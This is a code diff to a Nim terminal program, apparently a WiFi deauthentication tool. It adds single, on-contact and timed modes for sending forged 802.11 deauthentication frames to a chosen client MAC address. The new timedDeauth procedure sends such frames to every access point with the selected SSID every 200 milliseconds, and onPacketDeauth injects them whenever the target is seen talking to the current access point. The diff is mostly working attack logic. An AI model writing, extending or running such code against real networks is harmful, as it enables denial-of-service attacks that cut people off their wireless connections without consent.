@@ -12,6 +12,15 @@ type
   Stage = enum
     Menu, SelectSSID, PacketSniffing
 
+  DeauthMode = enum
+    Single, OnContact, Timed
+
+  MACStats = tuple
+    tx, rx: int
+    ch: CWChannel
+    rssi, deauths: int
+    lastPacketFrom: string ## MAC address where the last packet was seen from
+
   Deauther = ref object
     nb: NimBox
     current: Stage
@@ -21,12 +30,13 @@ type
     messagesOverlay: bool
     logger: ListBoxLogger
     deauthTarget: Option[string] ## MAC address we are targeting.
-    singleDeauthMode: bool
+    deauthMode: DeauthMode
     ouiData: OuiData
     refreshRate: int ## How long to wait before each packet refresh.
     channelSwitchRate: int ## How long to listen for packets on each channel.
     currentChannel: Option[CWChannel] ## Current channel being scanned.
     apCount: int ## Number of access points with the selected SSID being scanned.
+    macsData: OrderedTable[string, MACStats]
 
 proc getPacket(pcap: AsyncPcap,
                deauther: Deauther): Future[Option[(Radiotap, Packet)]] {.async.} =
@@ -63,13 +73,6 @@ proc writePacket(p: AsyncPcap, packet: Packet): Future[void] =
           addr packetData[0], packetData.len)
   return p.writePacket(radiotapData)
 
-type
-  MACStats = tuple
-    tx, rx: int
-    ch: CWChannel
-    rssi, deauths: int
-    lastPacketFrom: string ## MAC address where the last packet was seen from
-
 proc getInit(table: var OrderedTable[string, MACStats],
              key: string): var MACStats =
   if key notin table:
@@ -79,6 +82,36 @@ proc getInit(table: var OrderedTable[string, MACStats],
 proc `$`(chan: CWChannel): string =
   return fmt"{chan.channelNumber} ({($chan.channelBand)[14 .. ^1]}, " &
          fmt"{($chan.channelWidth)[15 .. ^1]})"
+
+proc onPacketDeauth(deauther: Deauther, p: AsyncPcap, bssid: string) {.async.} =
+  if deauther.deauthTarget.isSome and deauther.deauthMode in {Single, OnContact}:
+    let target = deauther.deauthTarget.get()
+    # Only deauth if last packet from target was sent to current BSSID.
+    if deauther.macsData.getInit(target).lastPacketFrom == bssid:
+      info("Deauthing ", target)
+      let packet = initDeauthenticationPacket(target, bssid, bssid)
+      await p.writePacket(packet)
+      deauther.macsData.getInit(target).deauths.inc()
+      deauther.macsData.getInit(bssid).deauths.inc()
+
+      if deauther.deauthMode == Single:
+        deauther.deauthTarget = none(string)
+
+proc timedDeauth(deauther: Deauther, p: AsyncPcap,
+                 accessPoints: Table[string, CWNetwork]) {.async.} =
+  ## Spams access points with deauth packets for the current target.
+  while deauther.current == PacketSniffing:
+    if deauther.deauthTarget.isSome() and deauther.deauthMode == Timed:
+      # Send a deauth packet to all access points.
+      let target = deauther.deauthTarget.get()
+      for bssid, network in accessPoints:
+        info("Deauthing ", target)
+        let packet = initDeauthenticationPacket(target, bssid, bssid)
+        await p.writePacket(packet)
+        deauther.macsData.getInit(target).deauths.inc()
+        deauther.macsData.getInit(bssid).deauths.inc()
+
+    await sleepAsync(200)
 
 proc gatherMacs(deauther: Deauther) {.async.} =
   let wfc = sharedWiFiClient()
@@ -102,11 +135,10 @@ proc gatherMacs(deauther: Deauther) {.async.} =
 
   deauther.apCount = accessPoints.len
 
+  asyncCheck timedDeauth(deauther, p, accessPoints)
+
   # Set up storage for MAC addresses.
-  var macs = initOrderedTable[
-    string,
-    MACStats
-  ]()
+  deauther.macsData = initOrderedTable[string, MACStats]()
   while deauther.current == PacketSniffing:
     for bssid, network in accessPoints:
       # Switch to network's channel.
@@ -138,35 +170,24 @@ proc gatherMacs(deauther: Deauther) {.async.} =
             debug("Skipping ", addr1, "<-", addr2)
             continue
 
-          macs.getInit(addr1).rx.inc()
-          macs.getInit(addr1).ch = network.wlanChannel
-          macs.getInit(addr1).rssi =
+          deauther.macsData.getInit(addr1).rx.inc()
+          deauther.macsData.getInit(addr1).ch = network.wlanChannel
+          deauther.macsData.getInit(addr1).rssi =
             radiotap.antennaSignal.int
-          macs.getInit(addr1).lastPacketFrom = addr2
-          macs.getInit(addr2).tx.inc()
-          macs.getInit(addr2).ch = network.wlanChannel
-          macs.getInit(addr2).rssi =
+          deauther.macsData.getInit(addr1).lastPacketFrom = addr2
+          deauther.macsData.getInit(addr2).tx.inc()
+          deauther.macsData.getInit(addr2).ch = network.wlanChannel
+          deauther.macsData.getInit(addr2).rssi =
             radiotap.antennaSignal.int
-          macs.getInit(addr2).lastPacketFrom = addr1
+          deauther.macsData.getInit(addr2).lastPacketFrom = addr1
 
-      if deauther.deauthTarget.isSome:
-        let target = deauther.deauthTarget.get()
-        # Only deauth if last packet from target was sent to current BSSID.
-        if macs.getInit(target).lastPacketFrom == bssid:
-          info("Deauthing ", target)
-          let packet = initDeauthenticationPacket(target, bssid, bssid)
-          await p.writePacket(packet)
-          macs.getInit(target).deauths.inc()
-          macs.getInit(bssid).deauths.inc()
-
-          if deauther.singleDeauthMode:
-            deauther.deauthTarget = none(string)
+      await onPacketDeauth(deauther, p, bssid)
 
     # Update UI
     let previousSelection = deauther.macsBox.getSelectedRow()
-    macs.sort((x, y) => -cmp(x[1].tx + x[1].rx, y[1].tx + y[1].rx))
+    deauther.macsData.sort((x, y) => -cmp(x[1].tx + x[1].rx, y[1].tx + y[1].rx))
     deauther.macsBox.clear()
-    for key, value in macs:
+    for key, value in deauther.macsData:
       if key in ["FF:FF:FF:FF:FF:FF", "00:00:00:00:00:00"]: continue
 
       let ouiOctets = key[0 ..< 8]
@@ -267,7 +288,10 @@ proc draw(deauther: Deauther) =
       "APs": $deauther.apCount,
       "CRC fails": $deauther.crcFails,
       "Mode":
-        if deauther.singleDeauthMode: "Manual" else: "Auto",
+        case deauther.deauthMode
+        of Single: "Manual"
+        of OnContact: "On Contact"
+        of Timed: "Timed (200ms)",
       "Refresh rate": fmt"{deauther.refreshRate}ms",
       "Channel switch rate": fmt"{deauther.channelSwitchRate}ms",
       "Status":
@@ -325,7 +349,11 @@ proc onSpace(deauther: Deauther) =
 proc onTab(deauther: Deauther) =
   case deauther.current
   of PacketSniffing:
-    deauther.singleDeauthMode = not deauther.singleDeauthMode
+    deauther.deauthMode =
+      case deauther.deauthMode
+      of Single: OnContact
+      of OnContact: Timed
+      of Timed: Single
   else:
     discard
 
